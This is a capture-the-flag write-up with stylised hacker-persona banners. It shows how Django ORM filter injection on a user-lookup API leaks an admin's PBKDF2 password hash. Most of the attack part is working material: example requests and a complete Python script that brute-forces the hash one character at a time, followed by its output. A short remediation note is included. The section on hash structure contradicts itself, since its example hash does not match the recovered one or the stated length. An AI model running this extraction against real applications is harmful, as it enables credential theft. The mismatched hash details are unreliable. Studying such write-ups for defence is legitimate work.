
`>> FINAL_TOUCH_ENGAGED._VIBE_CONSISTENCY_CHECK._SIGN-OFF_ELEVATED._51N5337_GLORY_MAXIMIZED.`  

---

# **ULTIMATE WRITE-UP: Exploiting Django ORM Injection to Leak admin Password Hash**  
*By 51n5337 & #OG*  

![](human-computer.png)

## **1. Entry Point: Why Not Login/Register?**  
The login and register forms (`/login` and `/register`) use POST requests with JSON bodies like:  
```json
{"username":"abc","password":"def"}
```  
These endpoints are **not vulnerable** because they don't expose ORM filter parameters. They authenticate or create users—they don't *query* users based on arbitrary filters.  

**The Real Entry Point:** `/api/user/` (POST)  
This endpoint is used to fetch user details by ID, but it blindly trusts the request body. Instead of sending:  
```json
{"id": 2}
```  
We can send ORM lookup expressions like:  
```json
{"password__startswith": "pbkdf2_"}
```  
This works because the backend code likely uses:  
```python
User.objects.get(**request.json)
```  
This `**` unpacking allows attackers to inject arbitrary query filters!  

---

## **2. Verifying the Vulnerability**  
### **Test 1: Confirm Admin Exists**  
**Request:**  
```http
POST /api/user/ HTTP/1.1
Host: api-ptl-91209657d735-3087dbcec8ec.libcurl.me
Content-Type: application/json
...
{"id": 2}
```  
**Response:**  
```json
[{"id":2,"username":"admin","first_name":"The PBKDF2 hash of my Password is","last_name":"the key for this challenge"}]
```  
✅ Admin user found.  

### **Test 2: ORM Injection with `username__startswith`**  
**Request:**  
```json
{"username__startswith": "ad"}
```  
**Response:** Returns admin user. ✅  

### **Test 3: ORM Injection with `password__startswith`**  
**Request:**  
```json
{"password__startswith": "pbkdf2_"}
```  
**Response:** Returns admin user. ✅  
**Vulnerability Confirmed!**  

---

## **3. Blind Exfiltration Script**  
We brute-force the hash character-by-character using:  
```json
{"password__startswith": "pbkdf2_<current_prefix><candidate_char>"}
```  
**Python Script:**  
```python
import requests

url = "https://api-ptl-91209657d735-3087dbcec8ec.libcurl.me/api/user/"
headers = {"Content-Type": "application/json"}
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=/$_"
known = "pbkdf2_"

while True:
    found = False
    for c in charset:
        payload = {"password__startswith": known + c}
        r = requests.post(url, json=payload, headers=headers)
        if "admin" in r.text:
            known += c
            print(f"[+] Found: {known}")
            found = True
            break
    if not found:
        break

print(f"[!] Full hash: {known}")
```  
**Run it:**  
```bash
python orm-bf.py
```  
**Output:**  
```
[+] Found: pbkdf2_sha256$720000$jevN68EnhTCFA4zbJvKqWK$ot0ShvR3CAFT1MSHg/yX9MSUEOLCK0
...
[!] Full hash: pbkdf2_sha256$720000$jevN68EnhTCFA4zbJvKqWK$ot0ShvR3CAFT1MSHg/yX9MSUEOLCK0StQFaRDSRgPLo=
```  

---

## **4. Note: Django Password Hash Structure**  
Django uses PBKDF2-SHA256 by default. The hash has the format:  
```
pbkdf2_sha256$<iterations>$<salt>$<hash>
```  
- **Iterations:** 720000 (configurable)  
- **Salt:** Random string (22 chars)  
- **Hash:** Base64-encoded (43-44 chars)  
Example:  
`pbkdf2_sha256$720000$jevN68EnhTCFA4zbJvKqWK$ot0ShvR3CAFT1MSHg/yX9MSUEOLCK0W5c7N0tHlCHLzRrV5X1H`  

---

## **5. Conclusion**  
- **Vulnerability:** Unsafe use of `**kwargs` in Django ORM queries.  
- **Impact:** Blind exfiltration of sensitive fields (e.g., password hashes).  
- **Fix:** Avoid passing user input directly to ORM filters. Use allow-lists for query parameters.  

**Submit the full hash as the key. Challenge solved.**  

---

**51n5337 Final Words:**  
*“I don’t just break systems—I understand them. Then I break them better.”*  
*This wasn’t a hack. It was a conversation with the code.*  

**-#OG & 51n5337**  
*Shadow Weavers // Digital Archaeologists // Masters of the ORM Glitch*  

`>> GUIDE_COMPLETE._VIBES_SYNCHRONIZED._REST_WELL._THE_MACHINE_WHISPERS_BACK.` 🔓🌌💀  

**GLITCH.NOTE:** The ultimate guide has landed. The shadows are watching.  
*Now go build something unbreakable. Or we’ll be back.* 😏⚡  

---